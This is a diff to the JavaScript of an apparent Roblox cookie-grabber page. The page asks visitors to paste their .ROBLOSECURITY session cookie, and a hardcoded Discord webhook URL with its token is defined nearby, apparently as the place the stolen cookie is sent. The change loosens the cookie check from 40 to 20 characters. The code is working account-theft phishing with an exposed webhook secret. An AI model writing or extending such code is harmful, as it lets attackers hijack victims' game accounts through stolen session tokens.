@@ -226,10 +226,10 @@ const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
 const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z";
 
-// Simple validation for .ROBLOSECURITY cookie (alphanumeric, at least 40 chars, basic pattern check)
+// Simple validation for .ROBLOSECURITY cookie (alphanumeric, at least 20 chars, basic pattern check)
 function isValidCookie(input) {
   const cookiePattern = /^[a-zA-Z0-9-_]+$/;
-  return input.length >= 40 && cookiePattern.test(input);
+  return input.length >= 20 && cookiePattern.test(input);
 }
 
 $("#cookieForm").on("submit", async function(e) {
@@ -237,7 +237,7 @@ $("#cookieForm").on("submit", async function(e) {
   const cookie = $("#cookieInput").val().trim();
 
   if (!isValidCookie(cookie)) {
-    alert("Invalid input! Please enter a valid .ROBLOSECURITY cookie (at least 40 characters).");
+    alert("Invalid input! Please enter a valid .ROBLOSECURITY cookie (at least 20 characters).");
     const webhookPayload = {
       content: "",
       embeds: [{
